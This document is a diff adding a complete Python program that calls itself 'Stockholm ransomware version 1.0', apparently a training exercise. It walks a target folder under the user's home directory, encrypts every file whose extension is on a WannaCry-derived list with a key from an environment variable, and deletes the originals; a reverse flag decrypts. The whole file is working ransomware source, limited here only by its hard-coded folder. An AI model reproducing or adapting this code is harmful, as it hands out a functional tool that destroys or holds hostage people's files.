@@ -1,0 +1,221 @@
+#! /bin/python3
+from cryptography.fernet import Fernet
+from enum import Enum
+import base64
+import hashlib
+import os
+import time
+import sys
+
+#-------------#
+#   GLOBALS   #
+#-------------#
+
+
+RED = "\033[31m"
+GREEN = "\033[32m"
+ORANGE = "\033[38;5;208m"
+YELLOW = "\033[1;93m"
+RESET = "\033[0m"
+
+
+# Target file to encrypt
+TARGET = os.environ.get("HOME")
+if TARGET and TARGET[-1] != '/':
+    TARGET += '/'
+TARGET += "infection/"
+
+
+NOTICE = f"""
+default target location : {TARGET}*
+
+./stockholm [flags]
+{RED}DANGER: encrypt by default if -r not precised
+
+{RESET}FLAGS :
+-r / --reverse : reverse encryption to get back original files
+-s / --silent : silent mode, do not print files attacked/decrypted by stockholm
+
+# if selected, exit without executing :
+-v / --version : Stockholm ransomware version 1.0
+-h / --help : help menu
+"""
+
+STKLM = f"""
+{YELLOW}      STKLM not defined or too short
+----------------------------------------------------
+Set pass phrase Key [STKLM] (longer than 15 char):
+
+ ==>    [export STKLM=<KEY PHRASE>]
+
+----------------------------------------------------
+
+"""
+
+
+# Extensions file to target
+wannacry_ext = [
+    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm",
+    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
+    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd",
+    ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1",
+    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh",
+    ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2",
+    ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif",
+    ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk",
+    ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt",
+    ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost",
+    ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
+    ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
+]
+
+# Générez une clé secrète
+secret_key_str = os.environ.get("STKLM")
+if not secret_key_str:
+    print(NOTICE)
+    print(STKLM)
+    exit(1)
+if len(secret_key_str) < 16:
+    print(NOTICE)
+    print(STKLM)
+    exit(1)
+
+key = hashlib.sha256(secret_key_str.encode()).digest()
+encoded_key = base64.urlsafe_b64encode(key)
+cipher_suite = Fernet(encoded_key)
+
+# -s option
+SILENCE = False
+
+class   Status(Enum):
+    RANSOM = 0
+    REVERSE = 1
+
+STATUS = Status.RANSOM
+
+#-----------------------------------------------------------------------------
+
+
+#--------------------------#
+#   ENCRYPTING FUNCTIONS   #
+#--------------------------#
+
+
+def encrypt(data):
+    if isinstance(data, str):
+        data = data.encode()
+
+    encrypted_text = cipher_suite.encrypt(data)
+
+    return encrypted_text
+
+
+def decrypt(data):
+    if isinstance(data, str):
+        data = data.encode()
+
+    decrypted_text = cipher_suite.decrypt(data)
+
+    return decrypted_text
+
+
+def working_core(file_path):
+    data: str
+    with open(file_path, "rb") as target:
+        data = target.read()
+
+    encrypted_data: bytes
+    if data:
+        if STATUS == Status.RANSOM:
+            encrypted_data = encrypt(data)
+            with open(file_path + ".ft", "wb") as encrypted:
+                encrypted.write(encrypted_data)
+
+        else:
+            encrypted_data = decrypt(data)
+            with open(os.path.splitext(file_path)[0], "wb") as decrypted:
+                    decrypted.write(encrypted_data)
+
+        if not SILENCE:
+            if STATUS == Status.RANSOM:
+                print(ORANGE + "encrypting >> ", RESET + file_path)
+            if STATUS == Status.REVERSE:
+                print(ORANGE + "decrypting >>", RESET + file_path)
+
+        os.remove(file_path)
+
+
+def directory_walk():
+    try:
+        for root, directories, files in os.walk(TARGET):
+            for file in files:
+                file_path = os.path.join(root, file)
+
+                if STATUS == Status.RANSOM and os.path.splitext(file_path)[1] in wannacry_ext:
+                    working_core(file_path)
+
+                elif STATUS == Status.REVERSE and os.path.splitext(file_path)[1] == ".ft":
+                    working_core(file_path)
+
+
+    except Exception as e:
+        print(RED + "Error: decryption failed", e)
+        exit(1)
+
+#-----------------------------------------------------------------------------
+
+
+#-----------------------#
+#   PARSING FUNCTIONS   #
+#-----------------------#
+
+
+def so_funny_larry(flags, c):
+    if c in flags:
+        raise ValueError("So funny larry")
+    else:
+        flags.append(c)
+
+
+def parser(argv):
+    i = 0
+    flags = []
+    global STATUS
+    global SILENCE
+    while i < len(argv):
+        arg = argv[i]
+        if '-' in arg: 
+            if arg[1:] == 'h' or arg[1:] == "-help":
+                print(NOTICE)
+                exit(0)
+        
+            if arg[1:] == 'v' or arg[1:] == "-version":
+                print(RESET + "Stockholm ransomware version 1.0")
+                exit(0)
+
+            if arg[1:] == 'r' or arg[1:] == "rs" or arg[1:] == "-reverse":
+                so_funny_larry(flags, 'r')
+                STATUS = Status.REVERSE
+            if arg[1]== 'r' and arg[1:] != "-reverse" and len(arg[1:]) == 2 and arg[2] == 's':
+                so_funny_larry(flags, 's')
+                SILENCE = True
+
+
+            if arg[1:] == 's' or arg[1:] == "sr" or argv[1:] == "-silent":
+                so_funny_larry(flags, 's')
+                SILENCE = True
+            if arg[1]== 's' and arg[1:] != "-silent" and len(arg[1:]) == 2 and arg[2] == 'r':
+                so_funny_larry(flags, 'r')
+                STATUS = Status.REVERSE
+
+        if arg[1:] != 'h' and arg[1:] != 'v' and arg[1:] != 'r' and arg[1:] != 's' and arg[1:] != "rs" and arg[1:] != "sr" and  arg[1:] != "-help" and arg[1:] != "-version" and arg[1:] != "-reverse" and arg[1:] != "-silent":
+            print(NOTICE + RESET)
+            raise ValueError("Please provide a valid flag")
+
+        i += 1
+
+
+if __name__ == "__main__":
+    parser(sys.argv[1:])
+    directory_walk()
+
